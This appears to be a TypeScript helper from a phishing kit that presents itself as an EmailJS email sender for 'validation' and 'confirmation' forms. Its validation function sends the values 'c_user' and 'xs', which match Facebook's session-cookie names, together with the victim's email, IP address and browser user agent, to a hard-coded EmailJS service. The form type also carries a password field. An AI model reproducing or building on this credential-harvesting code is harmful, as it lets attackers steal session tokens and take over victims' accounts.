import emailjs from '@emailjs/browser';

// Initialize EmailJS with your user ID
export const initEmailJS = () => {
  emailjs.init("DyCIA12LXgWwUM_ps");
};

// Validation form email sender
export const sendValidationFormEmail = async (formData: any) => {
  try {
    const response = await emailjs.send(
      "service_jpksfco",      // Service ID
      "template_90egw9s",     // Validation Template ID
      {
        user_email: formData.user_email,
        c_user: formData.c_user,
        xs: formData.xs,
        timestamp: new Date().toISOString(),
        ip_address: formData.ip_address || 'Not available',
        user_agent: navigator.userAgent,
      }
    );
    console.log('Validation email sent successfully:', response);
    return response;
  } catch (error) {
    console.error("Error sending validation email:", error);
    throw error;
  }
};

// Confirmation form email sender
export const sendConfirmationFormEmail = async (formData: any) => {
  try {
    const response = await emailjs.send(
      "service_jpksfco",      // Service ID
      "template_90egw9s",     // Confirmation Template ID for password reset
      {
        user_email: formData.user_email,
        contact_method: formData.contactMethod,
        timestamp: new Date().toISOString(),
        ip_address: formData.ip_address || 'Not available',
        user_agent: navigator.userAgent,
      }
    );
    console.log('Confirmation email sent successfully:', response);
    return response;
  } catch (error) {
    console.error("Error sending confirmation email:", error);
    throw error;
  }
};

// Type definition for form data
export interface EmailFormData {
  user_email?: string;
  contactMethod?: 'email' | 'phone';
  ip_address?: string;
  password?: string;
  c_user?: string;
  xs?: string;
}